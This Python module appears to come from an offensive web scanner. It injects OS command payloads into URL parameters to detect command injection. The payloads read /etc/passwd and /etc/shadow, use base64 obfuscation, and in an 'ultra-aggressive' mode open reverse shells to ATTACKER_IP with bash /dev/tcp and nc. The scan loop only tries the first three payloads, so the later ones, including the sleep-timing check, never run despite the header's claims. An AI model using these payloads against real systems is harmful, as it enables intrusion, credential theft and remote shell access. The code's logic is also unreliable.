#!/usr/bin/env python3
"""
⚡ Command Injection ULTRA-AGRESSIF — OWASP A05:2025
RCE complet + reverse shell
"""

import time
from colorama import Fore, Style

class CMDIRCE:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.YELLOW}[⚡ COMMAND INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        
        # Payloads Command Injection (tes payloads de scan_get_vuln.py + RCE)
        cmdi_payloads = [
            "; cat /etc/passwd",
            "& dir",
            "| whoami",
            "; sleep 3",
            "`id`",
            "$(id)",
        ]
        
        if self.aggressive:
            # Mode ULTRA-AGRESSIF : RCE complet + obfuscation
            cmdi_payloads += [
                "; cat /etc/shadow 2>/dev/null",
                "& net user",
                "| type C:\\Windows\\win.ini",
                "; uname -a",
                # Obfuscation (tes payloads boostés)
                "; cat$IFS/etc/passwd",
                "; {cat,/etc/passwd}",
                "; eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
                # RCE avancé
                "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "; nc -e /bin/bash ATTACKER_IP 4444",
            ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in cmdi_payloads[:3]:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                
                try:
                    # Time-based detection
                    if 'sleep' in payload.lower():
                        start = time.time()
                        resp = self.engine.session.get(injected_url, timeout=8)
                        elapsed = time.time() - start
                        
                        if elapsed > 3.5:
                            vuln = {
                                'type': 'cmdi',
                                'cwe': 'CWE-78',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': f'Time-based RCE: {elapsed:.2f}s'
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                    
                    else:
                        resp = self.engine.session.get(injected_url, timeout=5)
                        
                        # Indicateurs de sortie de commande (vérification AMÉLIORÉE)
                        cmd_indicators = ['root:x:0:0', 'uid=', 'bin/bash', 'Directory of', 
                                        'Volume Serial', 'C:\\Windows', '/etc/passwd']
                        
                        # 🔍 Vérifier que ce n'est pas une erreur SQL
                        sql_error_patterns = ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']
                        is_sql_error = any(pattern in resp.text.lower() for pattern in sql_error_patterns)
                        
                        if is_sql_error:
                            continue  # ❌ Faux positif : erreur SQL, pas Command Injection
                        
                        # ✅ Vraie détection Command Injection
                        if any(ind in resp.text for ind in cmd_indicators):
                            vuln = {
                                'type': 'cmdi',
                                'cwe': 'CWE-78',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': f"Sortie commande détectée"
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _print_vuln(self, vuln):
        print(f"\n    {Fore.YELLOW}[💥 Command Injection CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        print(f"      URL: {vuln['url']}\n")